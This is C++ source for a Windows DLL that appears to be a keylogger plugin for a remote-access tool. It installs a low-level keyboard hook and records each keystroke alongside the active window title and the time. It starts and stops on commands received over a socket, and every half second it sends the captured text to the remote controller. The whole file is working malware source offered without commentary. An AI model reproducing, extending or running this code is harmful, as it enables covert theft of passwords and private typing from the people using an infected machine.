#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <string>
#include <vector>
#include <mutex>
#include <ctime>
#include <atomic>
#include <thread>
#include "../../include/json.hpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "user32.lib")

using json = nlohmann::json;
using namespace std;

static SOCKET g_sock = INVALID_SOCKET;
static HHOOK g_hook = NULL;
static HWND g_lastWindow = NULL;
static atomic_bool g_running(false);
static thread g_hookThread;
static DWORD g_hookThreadId = 0;
static mutex g_sendMutex;
static string g_keyBuffer = "";
static mutex g_bufferMutex;

static const size_t MAX_BUFFER_SIZE = 65536; // 64KB safety limit

static string wide_to_utf8(const wstring& wstr) {
    if (wstr.empty()) return "";
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

static bool safe_send_raw(SOCKET sock, const string& data) {
    if (sock == INVALID_SOCKET) return false;
    const char* ptr = data.c_str();
    int remaining = (int)data.size();
    while (remaining > 0) {
        int sent = send(sock, ptr, remaining, 0);
        if (sent == SOCKET_ERROR || sent <= 0) return false;
        ptr += sent;
        remaining -= sent;
    }
    return true;
}

static void flush_buffer() {
    string dataToLog = "";
    {
        lock_guard<mutex> lock(g_bufferMutex);
        if (g_keyBuffer.empty()) return;
        dataToLog = g_keyBuffer;
        g_keyBuffer.clear();
    }

    try {
        lock_guard<mutex> lock(g_sendMutex);
        json j;
        j["action"] = "keylogdata";
        j["log"] = dataToLog;
        string serialized = j.dump(-1, ' ', false, json::error_handler_t::replace) + "\r\n";
        if (!safe_send_raw(g_sock, serialized)) {
            g_running = false;
        }
    } catch (...) {}
}

static void append_to_buffer(const string& log) {
    lock_guard<mutex> lock(g_bufferMutex);
    if (g_keyBuffer.size() + log.size() < MAX_BUFFER_SIZE) {
        g_keyBuffer += log;
    }
}

static string get_active_window_title() {
    wchar_t title[512];
    HWND hwnd = GetForegroundWindow();
    if (hwnd) {
        if (GetWindowTextW(hwnd, title, 512) > 0) {
            return wide_to_utf8(title);
        }
    }
    return "Unknown";
}

static string get_current_time_str() {
    time_t now = time(0);
    struct tm tstruct;
    char buf[80];
    tstruct = *localtime(&now);
    strftime(buf, sizeof(buf), "%H:%M", &tstruct);
    return string(buf);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKbdStruct->vkCode;

        HWND currentWindow = GetForegroundWindow();
        if (currentWindow != g_lastWindow) {
            g_lastWindow = currentWindow;
            string windowTitle = get_active_window_title();
            string timeStr = get_current_time_str();
            string header = "\r\n\r\n[" + timeStr + "] [" + windowTitle + "]\r\n";
            append_to_buffer(header);
        }

        string keyStr = "";
        bool isSpecial = false;

        switch (vkCode) {
            case VK_BACK:    keyStr = "[Back]"; isSpecial = true; break;
            case VK_RETURN:  keyStr = "[ENTER]\r\n"; isSpecial = true; break;
            case VK_SPACE:   keyStr = " "; isSpecial = true; break;
            case VK_TAB:     keyStr = "[Tab]"; isSpecial = true; break;
            case VK_ESCAPE:  keyStr = "[Esc]"; isSpecial = true; break;
            case VK_END:     keyStr = "[End]"; isSpecial = true; break;
            case VK_HOME:    keyStr = "[Home]"; isSpecial = true; break;
            case VK_LEFT:    keyStr = "[Left]"; isSpecial = true; break;
            case VK_UP:      keyStr = "[Up]"; isSpecial = true; break;
            case VK_RIGHT:   keyStr = "[Right]"; isSpecial = true; break;
            case VK_DOWN:    keyStr = "[Down]"; isSpecial = true; break;
            case VK_DELETE:  keyStr = "[Del]"; isSpecial = true; break;
            case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT:
            case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL:
            case VK_MENU: case VK_LMENU: case VK_RMENU:
            case VK_CAPITAL:
                return CallNextHookEx(g_hook, nCode, wParam, lParam);
        }

        if (!isSpecial) {
            BYTE keyboardState[256];
            for(int i=0; i<256; i++) keyboardState[i] = (BYTE)GetKeyState(i);

            DWORD dwThreadId = GetWindowThreadProcessId(currentWindow, NULL);
            HKL hLayout = GetKeyboardLayout(dwThreadId);

            wchar_t unicodeChar[8];
            int res = ToUnicodeEx(vkCode, pKbdStruct->scanCode, keyboardState, unicodeChar, 8, 0, hLayout);
            if (res > 0) {
                unicodeChar[res] = L'\0';
                keyStr = wide_to_utf8(unicodeChar);
            }
        }

        if (!keyStr.empty()) {
            append_to_buffer(keyStr);
        }
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

void StartHook() {
    g_hookThreadId = GetCurrentThreadId();
    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);

    UINT_PTR timerId = SetTimer(NULL, 0, 500, NULL);

    MSG msg;
    while (g_running && GetMessage(&msg, NULL, 0, 0)) {
        if (msg.message == WM_TIMER && msg.wParam == timerId) {
            flush_buffer();
        } else {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    KillTimer(NULL, timerId);
    if (g_hook) {
        UnhookWindowsHookEx(g_hook);
        g_hook = NULL;
    }
    flush_buffer();
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    g_sock = sock;
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* commandJson) {
    try {
        json command = json::parse(commandJson ? commandJson : "{}");
        string action = command.value("action", "");
        g_sock = sock;

        if (action == "keylogstart") {
            if (!g_running) {
                g_running = true;
                g_hookThread = thread(StartHook);
            }
        } else if (action == "keylogstop") {
            if (g_running) {
                g_running = false;
                if (g_hookThreadId != 0) {
                    PostThreadMessage(g_hookThreadId, WM_QUIT, 0, 0);
                }
                if (g_hookThread.joinable()) {
                    g_hookThread.join();
                }
                g_hookThreadId = 0;
            }
        }
    } catch (...) {}
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_DETACH) {
        g_running = false;
        if (g_hookThreadId != 0) {
            PostThreadMessage(g_hookThreadId, WM_QUIT, 0, 0);
        }
        if (g_hookThread.joinable()) {
            g_hookThread.join();
        }
    }
    return TRUE;
}
